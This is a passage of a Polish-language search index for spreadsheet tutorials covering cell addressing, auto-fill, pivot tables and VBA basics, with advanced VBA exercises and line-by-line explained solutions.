konkretnej kom\u00f3rki lub zakresu kom\u00f3rek, niezale\u017cnie od tego, gdzie w arkuszu umieszczasz lub kopiujesz formu\u0142\u0119.</p> <p>Za\u0142\u00f3\u017cmy, \u017ce masz warto\u015b\u0107 sta\u0142\u0105 w kom\u00f3rce A1, kt\u00f3r\u0105 chcesz u\u017cy\u0107 w serii oblicze\u0144 w kolumnie B. U\u017cywaj\u0105c adresowania <code>$A$1</code> w formule, mo\u017cesz swobodnie kopiowa\u0107 t\u0119 formu\u0142\u0119 w d\u00f3\u0142 kolumny B, zachowuj\u0105c sta\u0142e odwo\u0142anie do kom\u00f3rki A1.</p>"},{"location":"spreadsheet/addressing/#przykad-tabliczka-mnozenia","title":"Przyk\u0142ad: tabliczka mno\u017cenia","text":"<p>W tym przyk\u0142adzie pokazujemy, jak u\u017cywa\u0107 adresowania mieszanego, aby utworzy\u0107 tabliczk\u0119 mno\u017cenia.</p> <p></p>"},{"location":"spreadsheet/auto-fill/","title":"Auto-wype\u0142nianie","text":"<p>Auto-wype\u0142nianie w arkuszu kalkulacyjnym to funkcja, kt\u00f3ra automatycznie wype\u0142nia kom\u00f3rki na podstawie istniej\u0105cych wzorc\u00f3w danych lub formu\u0142. Kiedy zaczynasz wpisywa\u0107 dane, Excel pr\u00f3buje zrozumie\u0107 wzorzec i, gdy przeci\u0105gasz uchwyt wype\u0142nienia (ma\u0142y kwadrat w prawym dolnym rogu kom\u00f3rki), rozszerza ten wzorzec na inne kom\u00f3rki.</p>"},{"location":"spreadsheet/auto-fill/#przykady-zastosowan","title":"Przyk\u0142ady zastosowa\u0144","text":""},{"location":"spreadsheet/auto-fill/#wypenianie-serii-liczb","title":"Wype\u0142nianie serii liczb","text":"<p>Je\u015bli w dw\u00f3ch pierwszych kom\u00f3rkach wpiszesz kolejno liczby 1 i 2, a nast\u0119pnie u\u017cyjesz auto-wype\u0142niania, Excel utworzy seri\u0119 kolejnych liczb (2, 3, 4, ...).</p> <p></p>"},{"location":"spreadsheet/auto-fill/#daty-i-dni-tygodnia","title":"Daty i dni tygodnia","text":"<p>Mo\u017cesz szybko utworzy\u0107 seri\u0119 dat lub dni tygodnia. Na przyk\u0142ad, wpisuj\u0105c \u201ePoniedzia\u0142ek\u201d i u\u017cywaj\u0105c auto-wype\u0142niania, otrzymasz kolejne dni tygodnia.</p> <p></p>"},{"location":"spreadsheet/auto-fill/#miesiace","title":"Miesi\u0105ce","text":"<p>Podobnie, wpisuj\u0105c \"Stycze\u0144\" i u\u017cywaj\u0105c auto-wype\u0142niania, Excel utworzy seri\u0119 miesi\u0119cy.</p> <p></p>"},{"location":"spreadsheet/auto-fill/#wzory-numeryczne","title":"Wzory numeryczne","text":"<p>Je\u015bli w dw\u00f3ch pierwszych kom\u00f3rkach wpiszesz liczby tworz\u0105ce sekwencj\u0119 (np. 2, 4), auto-wype\u0142nianie mo\u017ce kontynuowa\u0107 t\u0119 sekwencj\u0119 (6, 8, 10, ...).</p> <p></p>"},{"location":"spreadsheet/auto-fill/#proste-cwiczenia","title":"Proste \u0107wiczenia","text":"<ol> <li>Tworzenie kalendarza: zacznij od wpisania daty, np. 01.01.2023, a nast\u0119pnie u\u017cyj auto-wype\u0142niania, aby utworzy\u0107 kalendarz na ca\u0142y miesi\u0105c.</li> <li>Generowanie listy numer\u00f3w ID: Wpisz ID-001, u\u017cyj auto-wype\u0142niania, aby utworzy\u0107 sekwencj\u0119 ID-002, ID-003, itd.</li> <li>Tworzenie serii kwarta\u0142\u00f3w: Zacznij od wpisania Q1, a nast\u0119pnie przeci\u0105gnij uchwyt wype\u0142nienia, aby utworzy\u0107 seri\u0119 Q2, Q3, Q4.</li> </ol>"},{"location":"spreadsheet/auto-fill/#ograniczenia","title":"Ograniczenia","text":"<ol> <li>Nierozpoznanie wzorca: je\u015bli wprowadzisz zbyt skomplikowany lub nieregularny wzorzec, Excel mo\u017ce nie by\u0107 w stanie go poprawnie zrozumie\u0107 i kontynuowa\u0107.</li> <li>Ograniczenia w rozpoznawaniu dat: Excel czasami mo\u017ce niepoprawnie interpretowa\u0107 daty, szczeg\u00f3lnie gdy format daty nie jest jasny.</li> <li>Wype\u0142nianie nielinearnych serii: auto-wype\u0142nianie najlepiej radzi sobie z liniowymi wzorami. Nielinearne, takie jak kwadratowe sekwencje, mog\u0105 wymaga\u0107 r\u0119cznego wprowadzenia lub bardziej z\u0142o\u017conej formu\u0142y.</li> </ol>"},{"location":"spreadsheet/auto-fill/#podsumowanie","title":"Podsumowanie","text":"<p>Auto-wype\u0142nianie to przydatna funkcja w Excelu, kt\u00f3ra mo\u017ce znacznie przyspieszy\u0107 proces wprowadzania danych. Jednak nale\u017cy by\u0107 \u015bwiadomym jej ogranicze\u0144 i wiedzie\u0107, kiedy mo\u017ce by\u0107 konieczne r\u0119czne dostosowanie lub zastosowanie bardziej skomplikowanych formu\u0142, aby osi\u0105gn\u0105\u0107 po\u017c\u0105dane rezultaty.</p>"},{"location":"spreadsheet/pivot-table/","title":"Wprowadzenie do tabel przestawnych","text":"<p>Tabele przestawne to pot\u0119\u017cne narz\u0119dzie do podsumowywania, analizowania, eksplorowania i prezentowania danych. Pozwalaj\u0105 na szybkie grupowanie i organizowanie du\u017cych zbior\u00f3w danych w klarowny i przyst\u0119pny spos\u00f3b, u\u0142atwiaj\u0105c analiz\u0119 i podejmowanie decyzji. Poni\u017cej kilka zalet wykorzystania tabel przestawnych:</p> <ol> <li>Efektywna analiza danych: umo\u017cliwiaj\u0105 szybk\u0105 analiz\u0119 danych bez potrzeby pisania z\u0142o\u017conych formu\u0142.</li> <li>Elastyczno\u015b\u0107: mo\u017cna \u0142atwo zmienia\u0107 spos\u00f3b prezentacji danych, grupowa\u0107 i por\u00f3wnywa\u0107 r\u00f3\u017cne zestawy informacji.</li> <li>Odkrywanie trend\u00f3w i wzorc\u00f3w: pomagaj\u0105 w identyfikacji trend\u00f3w, wzorc\u00f3w i anomalii w danych.</li> </ol>"},{"location":"spreadsheet/pivot-table/#tworzenie-tabeli-przestawnej","title":"Tworzenie tabeli przestawnej","text":"<ol> <li>Wyb\u00f3r danych: rozpocznij od zaznaczenia zakresu danych, kt\u00f3re chcesz analizowa\u0107.</li> <li>Inicjalizacja tabeli przestawnej: w Excelu wybierz opcj\u0119 tworzenia tabeli przestawnej, kt\u00f3ra znajduje si\u0119 na karcie Wstaw.</li> <li>Konfiguracja tabeli: przeci\u0105gnij pola danych do r\u00f3\u017cnych sekcji tabeli przestawnej, takich jak wiersze, kolumny, warto\u015bci i filtry, aby zorganizowa\u0107 dane zgodnie z twoimi potrzebami.</li> </ol>"},{"location":"spreadsheet/pivot-table/#skadniki-tabeli-przestawnej","title":"Sk\u0142adniki tabeli przestawnej","text":"<ul> <li>Pola wierszy i kolumn: okre\u015blaj\u0105, jak dane s\u0105 grupowane. Na przyk\u0142ad, mo\u017cesz grupowa\u0107 dane wed\u0142ug daty w wierszach i wed\u0142ug kategorii produkt\u00f3w w kolumnach.</li> <li>Pola warto\u015bci: to s\u0105 dane, kt\u00f3re chcesz analizowa\u0107, np. sumy sprzeda\u017cy, \u015brednie, liczba wyst\u0105pie\u0144.</li> <li>Pola filtr\u00f3w: pozwalaj\u0105 na filtrowanie ca\u0142ej tabeli przestawnej wed\u0142ug okre\u015blonych kryteri\u00f3w, np. wed\u0142ug konkretnego pracownika czy regionu.</li> </ul>"},{"location":"spreadsheet/pivot-table/#porady-dla-poczatkujacych","title":"Porady dla pocz\u0105tkuj\u0105cych","text":"<ul> <li>Rozpoczynaj od prostych tabel: zacznij od podstawowych tabel przestawnych, aby zrozumie\u0107, jak dzia\u0142aj\u0105 r\u00f3\u017cne pola.</li> <li>Eksperymentuj z r\u00f3\u017cnymi uk\u0142adami: zmieniaj ustawienia p\u00f3l, aby zobaczy\u0107, jak wp\u0142ywaj\u0105 na prezentacj\u0119 danych.</li> <li>U\u017cywaj funkcji grupowania: Excel pozwala na grupowanie danych, np. dat, co jest szczeg\u00f3lnie przydatne przy analizie trend\u00f3w czasowych.</li> </ul>"},{"location":"spreadsheet/pivot-table/#ograniczenia-tabel-przestawnych","title":"Ograniczenia tabel przestawnych","text":"<ul> <li>\u0179r\u00f3d\u0142o danych: tabele przestawne wymagaj\u0105 dobrze zorganizowanych i sp\u00f3jnych \u017ar\u00f3de\u0142 danych.</li> <li>Edycja danych: bezpo\u015brednia edycja danych w tabeli przestawnej jest ograniczona; zmiany nale\u017cy wprowadza\u0107 w \u017ar\u00f3d\u0142owych danych.</li> <li>Z\u0142o\u017cone analizy: dla bardzo z\u0142o\u017conych analiz danych, tabela przestawna mo\u017ce by\u0107 niewystarczaj\u0105ca i konieczne mog\u0105 by\u0107 bardziej zaawansowane techniki analityczne.</li> </ul>"},{"location":"spreadsheet/vba/","title":"Visual Basic for Applications","text":"<p>Visual Basic for Applications, czyli VBA, to j\u0119zyk programowania stworzony przez firm\u0119 Microsoft, kt\u00f3ry jest u\u017cywany w programach pakietu Office, w tym w Excelu. Umo\u017cliwia tworzenie makr, kt\u00f3re automatyzuj\u0105 zadania, i rozwijanie zaawansowanych funkcjonalno\u015bci w arkuszach kalkulacyjnych.</p> <p>VBA rozszerza mo\u017cliwo\u015bci Excela, umo\u017cliwiaj\u0105c u\u017cytkownikom tworzenie zaawansowanych i dostosowanych rozwi\u0105za\u0144 do przetwarzania danych, analizy finansowej, tworzenia raport\u00f3w i wielu innych zada\u0144. Jest to pot\u0119\u017cne narz\u0119dzie dla tych, kt\u00f3rzy chc\u0105 wyj\u015b\u0107 poza standardowe funkcje oferowane przez Excela.</p>"},{"location":"spreadsheet/vba/#podstawy-vba-w-excelu","title":"Podstawy VBA w Excelu","text":"<ol> <li>Makra: sekwencje polece\u0144, kt\u00f3re automatyzuj\u0105 zadania. Mo\u017cesz je nagrywa\u0107 bezpo\u015brednio w Excelu lub pisa\u0107 r\u0119cznie w edytorze VBA.</li> <li>Edytor VBA: \u015brodowisko, w kt\u00f3rym piszesz i edytujesz kod VBA. Dost\u0119p do niego uzyskasz poprzez wci\u015bni\u0119cie <code>Alt + F11</code> w Excelu.</li> <li>Modu\u0142y: kontenery na kod, gdzie piszesz i organizujesz makra oraz inne procedury VBA.</li> <li>Procedury: w VBA, procedury to bloki kodu, kt\u00f3re wykonuj\u0105 okre\u015blone zadania. S\u0105 dwa g\u0142\u00f3wne typy: procedury sub (kt\u00f3re wykonuj\u0105 zadania) i funkcje (kt\u00f3re zwracaj\u0105 warto\u015bci).</li> </ol>"},{"location":"spreadsheet/vba/#zastosowania-vba-w-excelu","title":"Zastosowania VBA w Excelu","text":"<ol> <li>Automatyzacja zada\u0144: mo\u017cesz automatyzowa\u0107 rutynowe i powtarzalne zadania, takie jak formatowanie danych, generowanie raport\u00f3w, czy przetwarzanie wprowadzonych danych.</li> <li>Tworzenie zaawansowanych formu\u0142: mo\u017cesz tworzy\u0107 niestandardowe funkcje, kt\u00f3re dzia\u0142aj\u0105 podobnie do wbudowanych funkcji Excela, ale s\u0105 dostosowane do konkretnych potrzeb.</li> <li>Interakcja z u\u017cytkownikiem: VBA pozwala tworzy\u0107 formularze, okna dialogowe, kt\u00f3re u\u0142atwiaj\u0105 wprowadzanie danych i interakcj\u0119 z dokumentem.</li> </ol>"},{"location":"spreadsheet/vba/#dobre-praktyki-i-wskazowki","title":"Dobre Praktyki i Wskaz\u00f3wki","text":"<ol> <li>Komentowanie kodu: zawsze dokumentuj, co robi tw\u00f3j kod, aby by\u0142 zrozumia\u0142y dla Ciebie i innych os\u00f3b, kt\u00f3re mog\u0105 go u\u017cywa\u0107 lub modyfikowa\u0107 w przysz\u0142o\u015bci.</li> <li>Testowanie i debugowanie: regularnie testuj kod, aby upewni\u0107 si\u0119, \u017ce dzia\u0142a prawid\u0142owo, i stosuj narz\u0119dzia debugowania dost\u0119pne w edytorze VBA, aby identyfikowa\u0107 i naprawia\u0107 b\u0142\u0119dy.</li> <li>Nauka dobrych praktyk: zdob\u0105d\u017a wiedz\u0119 na temat najlepszych praktyk programowania VBA, aby tworzy\u0107 kod, kt\u00f3ry jest nie tylko funkcjonalny, ale tak\u017ce wydajny i bezpieczny.</li> </ol>"},{"location":"spreadsheet/vba/#sciaga","title":"\u015aci\u0105ga","text":"<p> VBA Reference Card</p>"},{"location":"spreadsheet/vba/exercises/","title":"\u0106wiczenia","text":"<p>Przed przyst\u0105pieniem do rozwi\u0105zywania zada\u0144 zapoznaj si\u0119 z poni\u017cszym opisem.</p> <p>Po\u015bwi\u0119\u0107 czas na rozwi\u0105zanie ka\u017cdego zadania. Zastan\u00f3w si\u0119 nad r\u00f3\u017cnymi sposobami podej\u015bcia i rozwi\u0105zania problemu.</p> <p>Danger</p> <p>Zajrzyj do przyk\u0142adowego rozwi\u0105zania dopiero, jak samodzielnie wykonasz zadanie.</p>"},{"location":"spreadsheet/vba/exercises/advanced/","title":"Zaawansowane","text":""},{"location":"spreadsheet/vba/exercises/advanced/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz funkcj\u0119 <code>SzukajMax</code>, kt\u00f3ra dla podanego zakresu kom\u00f3rek, znajdzie i zwr\u00f3ci jako wynik adres kom\u00f3rki zawieraj\u0105cej warto\u015b\u0107 maksymaln\u0105. Je\u017celi kilka kom\u00f3rek zawiera t\u0119 warto\u015b\u0107, funkcja powinna zwr\u00f3ci\u0107 adres pierwszej z nich.</p>"},{"location":"spreadsheet/vba/exercises/advanced/#przykad","title":"Przyk\u0142ad","text":"<pre><code>SzukajMax(A1:A10) = $A$3\n</code></pre>"},{"location":"spreadsheet/vba/exercises/advanced/#zadanie-2","title":"Zadanie 2","text":"<p>Stw\u00f3rz przycisk, kt\u00f3ry po klikni\u0119ciu pokoloruje wszystkie kom\u00f3rki w zakresie <code>A1:A10</code>, kt\u00f3re zawieraj\u0105 warto\u015b\u0107 poni\u017cej \u015bredniej z tego zakresu.</p>"},{"location":"spreadsheet/vba/exercises/advanced/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"spreadsheet/vba/exercises/advanced/#zadanie-3","title":"Zadanie 3","text":"<p>Stw\u00f3rz przycisk, kt\u00f3ry po klikni\u0119ciu wpisze w kolumnie C wszystkie warto\u015bci z zakresu <code>A1:A10</code>, kt\u00f3re wyst\u0119puj\u0105 jednocze\u015bnie w zakresie <code>B1:B10</code>. Mo\u017cesz za\u0142o\u017cy\u0107, \u017ce w obu zakresach warto\u015bci s\u0105 unikalne w ramach danego zakresu.</p>"},{"location":"spreadsheet/vba/exercises/advanced/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"spreadsheet/vba/exercises/advanced/#zadanie-4","title":"Zadanie 4","text":"<p>Kom\u00f3rki <code>A1:A10</code> zawieraj\u0105 imiona i nazwiska oddzielone pojedyncz\u0105 spacj\u0105. Stw\u00f3rz przycisk, kt\u00f3ry po klikni\u0119ciu umie\u015bci w kolumnie B imiona, a w kolumnie C nazwiska z odpowiadaj\u0105cych kom\u00f3rek z kolumny A.</p>"},{"location":"spreadsheet/vba/exercises/advanced/#przykad_3","title":"Przyk\u0142ad","text":""},{"location":"spreadsheet/vba/exercises/advanced/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz funkcj\u0119 <code>ZliczWyrazy</code>, kt\u00f3ra dla podanego tekstu zwr\u00f3ci liczb\u0119 wyraz\u00f3w w nim zawartych. Za wyraz uznajemy ci\u0105g znak\u00f3w nie zawieraj\u0105cy spacji, a wyrazy s\u0105 oddzielone pojedyncz\u0105 spacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/advanced/#przykad_4","title":"Przyk\u0142ad","text":"<pre><code>ZliczWyrazy(\"Ala ma kota\") = 3\nZliczWyrazy(\"Ala ma kota, a kot ma Al\u0119\") = 7\n</code></pre>"},{"location":"spreadsheet/vba/exercises/advanced/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"spreadsheet/vba/exercises/advanced/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz funkcj\u0119 <code>SzukajMax</code>, kt\u00f3ra dla podanego zakresu kom\u00f3rek, znajdzie i zwr\u00f3ci jako wynik adres kom\u00f3rki zawieraj\u0105cej warto\u015b\u0107 maksymaln\u0105. Je\u017celi kilka kom\u00f3rek zawiera t\u0119 warto\u015b\u0107, funkcja powinna zwr\u00f3ci\u0107 adres pierwszej z nich.</p>"},{"location":"spreadsheet/vba/exercises/advanced/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Function SzukajMax(zakres As Range) As String\n    maks = Application.WorksheetFunction.Max(zakres)\n\n    For Each kom In zakres\n        If kom.Value = maks Then\n            SzukajMax = kom.Address\n            Exit For\n        End If\n    Next kom\nEnd Function\n</code></pre>"},{"location":"spreadsheet/vba/exercises/advanced/solution-1/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/advanced/solution-1/#1-definicja-funkcji","title":"1. Definicja funkcji","text":"<pre><code>Function SzukajMax(zakres As Range) As String\n</code></pre> <ul> <li><code>Function SzukajMax</code> rozpoczyna definicj\u0119 funkcji o nazwie <code>SzukajMax</code>.</li> <li><code>zakres As Range</code> oznacza, \u017ce funkcja przyjmuje jeden argument (wej\u015bcie) o nazwie <code>zakres</code>, kt\u00f3ry jest typu <code>Range</code>. <code>Range</code> odnosi si\u0119 do zakresu kom\u00f3rek w arkuszu Excela.</li> <li><code>As String</code> na ko\u0144cu m\u00f3wi, \u017ce funkcja zwraca warto\u015b\u0107 typu <code>String</code> (ci\u0105g znak\u00f3w), kt\u00f3ry b\u0119dzie adresem kom\u00f3rki.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-1/#2-znalezienie-maksymalnej-wartosci","title":"2. Znalezienie maksymalnej warto\u015bci","text":"<pre><code>maks = Application.WorksheetFunction.Max(zakres)\n</code></pre> <ul> <li><code>maks = Application.WorksheetFunction.Max(zakres)</code> wykorzystuje wbudowan\u0105 funkcj\u0119 <code>Max</code> do znalezienia najwi\u0119kszej warto\u015bci w podanym zakresie <code>zakres</code>. Wynik jest przypisywany do zmiennej <code>maks</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-1/#3-przeszukiwanie-zakresu-w-poszukiwaniu-maksymalnej-wartosci","title":"3. Przeszukiwanie zakresu w poszukiwaniu maksymalnej warto\u015bci","text":"<pre><code>For Each kom In zakres\n</code></pre> <ul> <li><code>For Each kom In zakres</code> rozpoczyna p\u0119tl\u0119, kt\u00f3ra przejdzie przez ka\u017cd\u0105 kom\u00f3rk\u0119 (<code>kom</code>) w okre\u015blonym zakresie (<code>zakres</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-1/#4-porownanie-wartosci-i-znalezienie-adresu","title":"4. Por\u00f3wnanie warto\u015bci i znalezienie adresu","text":"<pre><code>    If kom.Value = maks Then\n        SzukajMax = kom.Address\n        Exit For\n    End If\n</code></pre> <ul> <li><code>If kom.Value = maks Then</code> sprawdza, czy warto\u015b\u0107 w aktualnie przegl\u0105danej kom\u00f3rce (<code>kom.Value</code>) jest r\u00f3wna maksymalnej znalezionej warto\u015bci (<code>maks</code>).</li> <li><code>SzukajMax = kom.Address</code> przypisuje adres kom\u00f3rki z maksymaln\u0105 warto\u015bci\u0105 do samej funkcji <code>SzukajMax</code>, co oznacza, \u017ce funkcja zwr\u00f3ci ten adres jako sw\u00f3j wynik.</li> <li><code>Exit For</code> natychmiast ko\u0144czy p\u0119tl\u0119 po znalezieniu kom\u00f3rki z maksymaln\u0105 warto\u015bci\u0105, poniewa\u017c ju\u017c znaleziono potrzebne informacje.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-1/#5-koniec-petli","title":"5. Koniec p\u0119tli","text":"<pre><code>Next kom\n</code></pre> <ul> <li><code>Next kom</code> ko\u0144czy bie\u017c\u0105cy cykl p\u0119tli i przechodzi do nast\u0119pnej kom\u00f3rki w zakresie, je\u015bli nie znaleziono jeszcze kom\u00f3rki z maksymaln\u0105 warto\u015bci\u0105.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-1/#6-koniec-funkcji","title":"6. Koniec funkcji","text":"<pre><code>End Function\n</code></pre> <ul> <li><code>End Function</code> oznacza koniec definicji funkcji.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"spreadsheet/vba/exercises/advanced/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Stw\u00f3rz przycisk, kt\u00f3ry po klikni\u0119ciu pokoloruje wszystkie kom\u00f3rki w zakresie <code>A1:A10</code>, kt\u00f3re zawieraj\u0105 warto\u015b\u0107 poni\u017cej \u015bredniej z tego zakresu.</p>"},{"location":"spreadsheet/vba/exercises/advanced/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Sub PonizejSredniej_Click()\n    Dim zakres As Range\n    Dim srednia As Double\n\n    Set zakres = Range(\"A1:A10\")\n    srednia = Application.WorksheetFunction.Average(zakres)\n\n    For Each kom In zakres\n        If kom.Value &lt; srednia Then\n            kom.Interior.Color = RGB(0, 255, 0)\n        End If\n    Next kom\nEnd Sub\n</code></pre>"},{"location":"spreadsheet/vba/exercises/advanced/solution-2/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/advanced/solution-2/#1-deklarowanie-zmiennych","title":"1. Deklarowanie zmiennych","text":"<pre><code>Dim zakres As Range\nDim srednia As Double\n</code></pre> <ul> <li><code>Dim zakres As Range</code> deklaruje zmienn\u0105 <code>zakres</code>, kt\u00f3ra b\u0119dzie przechowywa\u0107 odniesienie do zakresu kom\u00f3rek.</li> <li><code>Dim srednia As Double</code> deklaruje zmienn\u0105 <code>srednia</code>, kt\u00f3ra b\u0119dzie przechowywa\u0107 \u015bredni\u0105 warto\u015b\u0107 jako liczb\u0119 zmiennoprzecinkow\u0105 (<code>Double</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-2/#2-ustawianie-zakresu-i-obliczanie-sredniej","title":"2. Ustawianie zakresu i obliczanie \u015bredniej","text":"<pre><code>Set zakres = Range(\"A1:A10\")\nsrednia = Application.WorksheetFunction.Average(zakres)\n</code></pre> <ul> <li><code>Set zakres = Range(\"A1:A10\")</code> przypisuje zakres kom\u00f3rek od A1 do A10 do zmiennej <code>zakres</code>.</li> <li><code>srednia = Application.WorksheetFunction.Average(zakres)</code> oblicza \u015bredni\u0105 warto\u015b\u0107 dla podanego zakresu za pomoc\u0105 funkcji <code>Average</code> i przypisuje wynik do zmiennej <code>srednia</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-2/#3-petla-przez-komorki-w-zakresie","title":"3. P\u0119tla przez kom\u00f3rki w zakresie","text":"<pre><code>For Each kom In zakres\n</code></pre> <ul> <li><code>For Each kom In zakres</code> rozpoczyna p\u0119tl\u0119, kt\u00f3ra wykona blok kodu dla ka\u017cdej kom\u00f3rki (<code>kom</code>) w okre\u015blonym zakresie (<code>zakres</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-2/#4-sprawdzanie-wartosci-i-zmiana-koloru-ta","title":"4. Sprawdzanie warto\u015bci i zmiana koloru t\u0142a","text":"<pre><code>    If kom.Value &lt; srednia Then\n        kom.Interior.Color = RGB(0, 255, 0)\n    End If\n</code></pre> <ul> <li><code>If kom.Value &lt; srednia Then</code> sprawdza, czy warto\u015b\u0107 aktualnie przegl\u0105danej kom\u00f3rki (<code>kom.Value</code>) jest mniejsza ni\u017c \u015brednia (<code>srednia</code>).</li> <li><code>kom.Interior.Color = RGB(0, 255, 0)</code> zmienia kolor t\u0142a kom\u00f3rki na zielony (za pomoc\u0105 kodu koloru RGB), je\u015bli warto\u015b\u0107 jest poni\u017cej \u015bredniej.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-2/#5-koniec-petli","title":"5. Koniec p\u0119tli","text":"<pre><code>Next kom\n</code></pre> <ul> <li><code>Next kom</code> ko\u0144czy bie\u017c\u0105cy cykl p\u0119tli i przechodzi do nast\u0119pnej kom\u00f3rki w zakresie, je\u015bli nie wszystkie kom\u00f3rki zosta\u0142y jeszcze sprawdzone.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-2/#6-koniec-procedury","title":"6. Koniec procedury","text":"<pre><code>End Sub\n</code></pre> <ul> <li><code>End Sub</code> oznacza koniec procedury.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"spreadsheet/vba/exercises/advanced/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Stw\u00f3rz przycisk, kt\u00f3ry po klikni\u0119ciu wpisze w kolumnie C wszystkie warto\u015bci z zakresu <code>A1:A10</code>, kt\u00f3re wyst\u0119puj\u0105 jednocze\u015bnie w zakresie <code>B1:B10</code>. Mo\u017cesz za\u0142o\u017cy\u0107, \u017ce w obu zakresach warto\u015bci s\u0105 unikalne w ramach danego zakresu.</p>"},{"location":"spreadsheet/vba/exercises/advanced/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Sub CzescWspolna_Click()\n    Dim dane1, dane2, wynik As Range\n\n    Set dane1 = Range(\"A1:A10\")\n    Set dane2 = Range(\"B1:B10\")\n    Set wynik = Range(\"C1\")\n\n    For Each kom1 In dane1\n        For Each kom2 In dane2\n            If kom1.Value = kom2.Value Then\n                wynik.Value = kom1.Value\n                Set wynik = wynik.Offset(1, 0)\n                Exit For\n            End If\n        Next kom2\n    Next kom1\nEnd Sub\n</code></pre>"},{"location":"spreadsheet/vba/exercises/advanced/solution-3/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/advanced/solution-3/#1-deklarowanie-zmiennych","title":"1. Deklarowanie zmiennych","text":"<pre><code>Dim dane1, dane2, wynik As Range\n</code></pre> <ul> <li><code>Dim</code> u\u017cywane jest do deklaracji zmiennych.</li> <li><code>dane1, dane2, wynik</code> s\u0105 zmiennymi reprezentuj\u0105cymi zakresy kom\u00f3rek w arkuszu.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-3/#2-ustawianie-zakresow","title":"2. Ustawianie zakres\u00f3w","text":"<pre><code>Set dane1 = Range(\"A1:A10\")\nSet dane2 = Range(\"B1:B10\")\nSet wynik = Range(\"C1\")\n</code></pre> <ul> <li><code>Set</code> przypisuje odniesienie do obiektu do zmiennej.</li> <li><code>dane1</code> i <code>dane2</code> s\u0105 ustawione na zakresy kom\u00f3rek A1:A10 i B1:B10 odpowiednio, a <code>wynik</code> jest ustawiony na kom\u00f3rk\u0119 C1.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-3/#3-petla-przez-kazda-komorke-w-zakresie-dane1","title":"3. P\u0119tla przez ka\u017cd\u0105 kom\u00f3rk\u0119 w zakresie dane1","text":"<pre><code>For Each kom1 In dane1\n</code></pre> <ul> <li><code>For Each</code> to p\u0119tla, kt\u00f3ra wykonuje blok kodu dla ka\u017cdego elementu w kolekcji (tutaj dla ka\u017cdej kom\u00f3rki w zakresie <code>dane1</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-3/#4-druga-petla-przez-kazda-komorke-w-zakresie-dane2","title":"4. Druga p\u0119tla przez ka\u017cd\u0105 kom\u00f3rk\u0119 w zakresie dane2","text":"<pre><code>    For Each kom2 In dane2\n</code></pre> <ul> <li>To druga p\u0119tla <code>For Each</code> wewn\u0105trz pierwszej, kt\u00f3ra przechodzi przez ka\u017cd\u0105 kom\u00f3rk\u0119 w zakresie <code>dane2</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-3/#5-porownanie-wartosci-i-zapisywanie-wyniku","title":"5. Por\u00f3wnanie warto\u015bci i zapisywanie wyniku","text":"<pre><code>        If kom1.Value = kom2.Value Then\n            wynik.Value = kom1.Value\n            Set wynik = wynik.Offset(1, 0)\n            Exit For\n        End If\n</code></pre> <ul> <li><code>If kom1.Value = kom2.Value Then</code> sprawdza, czy warto\u015b\u0107 w kom\u00f3rce z <code>dane1</code> jest taka sama jak warto\u015b\u0107 w kom\u00f3rce z <code>dane2</code>.</li> <li>Je\u015bli warto\u015bci s\u0105 takie same, warto\u015b\u0107 ta jest umieszczana w kom\u00f3rce wskazanej przez <code>wynik</code>.</li> <li><code>Set wynik = wynik.Offset(1, 0)</code> przesuwa zakres <code>wynik</code> o jedn\u0105 kom\u00f3rk\u0119 w d\u00f3\u0142, by nast\u0119pna warto\u015b\u0107 wsp\u00f3lna by\u0142a zapisana w kolejnej kom\u00f3rce.</li> <li><code>Exit For</code> natychmiast ko\u0144czy wewn\u0119trzn\u0105 p\u0119tl\u0119 <code>For Each</code>, gdy znaleziono dopasowanie, aby unikn\u0105\u0107 niepotrzebnego przeszukiwania reszty <code>dane2</code> dla tej samej warto\u015bci <code>kom1</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-3/#6-koniec-petli","title":"6. Koniec p\u0119tli","text":"<pre><code>        Next kom2\n    Next kom1\n</code></pre> <ul> <li><code>Next kom2</code> i <code>Next kom1</code> oznaczaj\u0105 koniec odpowiednich p\u0119tli <code>For Each</code> i powr\u00f3t do ich pocz\u0105tku, aby przej\u015b\u0107 do kolejnej kom\u00f3rki w odpowiednich zakresach.</li> </ul>"},{"location":"spreadsheet/vba/exercises/advanced/solution-3/#7-koniec-procedury","title":"7. Koniec procedury","text":"<pre><code>End Sub\n</code></pre> <ul> <li><code>End Sub</code> oznacza koniec skryptu (procedury).</li> 